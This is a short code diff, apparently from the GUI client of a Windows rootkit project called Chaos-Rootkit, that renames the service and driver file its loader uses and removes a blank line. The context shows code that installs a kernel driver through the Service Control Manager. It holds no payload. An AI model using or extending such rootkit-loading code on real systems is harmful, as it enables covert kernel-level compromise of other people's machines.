@@ -108,7 +108,7 @@ BOOL loadDriver(char* driverPath) {
     hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (hSCM == NULL)
         return (1);
-    const char* g_serviceName = "ZeroMemoryEx";
+    const char* g_serviceName = "Chaos-Rootkit";
 
     hService = OpenServiceA(hSCM, g_serviceName, SERVICE_ALL_ACCESS);
     if (hService != NULL) {
@@ -271,7 +271,7 @@ int main(int, char**)
                 char FullDriverPath[MAX_PATH];
                 BOOL once = 1;
 
-                hFind = FindFirstFileA("ZeroMemoryEx.sys", &fileData);
+                hFind = FindFirstFileA("Chaos-Rootkit.sys", &fileData);
 
                 if (hFind != INVALID_HANDLE_VALUE)
                 {
@@ -505,7 +505,6 @@ int main(int, char**)
         glViewport(0, 0, display_w, display_h);
 
         glClearColor(clear_color.x * clear_color.w, clear_color.y * clear_color.w, clear_color.z * clear_color.w, clear_color.w);
-
         glClear(GL_COLOR_BUFFER_BIT);
 
         ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());
